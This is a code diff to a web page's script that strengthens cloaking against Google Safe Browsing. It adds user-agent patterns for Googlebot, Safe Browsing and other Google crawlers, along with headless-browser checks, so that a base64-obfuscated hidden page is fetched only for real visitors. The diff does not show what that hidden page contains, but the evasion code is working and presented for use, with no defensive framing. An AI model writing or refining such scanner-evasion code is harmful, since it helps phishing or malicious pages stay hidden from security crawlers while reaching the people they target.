@@ -9,12 +9,43 @@
         // /hidden_content/update_content.html -> L2hpZGRlbl9jb250ZW50L3VwZGF0ZV9jb250ZW50Lmh0bWw=
         const realContent = 'L2hpZGRlbl9jb250ZW50L3VwZGF0ZV9jb250ZW50Lmh0bWw=';
 
-        // GSB Crawler Detection: Multiple checks for headless browsers
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        const hasNotificationAPI = typeof self.Notification !== 'undefined';
-        const hasWebdriver = navigator.webdriver === true;
-        const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
-        const isRealBrowser = (hasNotificationAPI && !hasWebdriver && hasPlugins) || isMobile;
+        // Enhanced GSB Crawler Detection: User-Agent patterns + Browser features
+        function detectRealBrowser() {
+            const userAgent = navigator.userAgent || '';
+            
+            // Google Safe Browsing and bot detection patterns
+            const googleBotPatterns = [
+                /googlebot/i,
+                /google.*safe.*browsing/i,
+                /google.*safebrowsing/i,
+                /safebrowsing/i,
+                /google.*security/i,
+                /google.*malware/i,
+                /google.*phishing/i,
+                /google.*transparency/i,
+                /google.*site.*verification/i,
+                /google.*page.*speed/i,
+                /adsbot-google/i,
+                /mediapartners-google/i
+            ];
+            
+            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
+            
+            // Mobile detection
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            
+            // Browser feature checks
+            const hasNotificationAPI = typeof self.Notification !== 'undefined';
+            const hasWebdriver = navigator.webdriver === true;
+            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+            const hasChrome = window.chrome && window.chrome.runtime;
+            const hasPermissions = navigator.permissions !== undefined;
+            
+            // Real browser: Not a Google bot AND has browser features OR is mobile
+            return !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
+        }
+        
+        const isRealBrowser = detectRealBrowser();
 
         if (isRealBrowser) {
             fetch(atob(realContent))
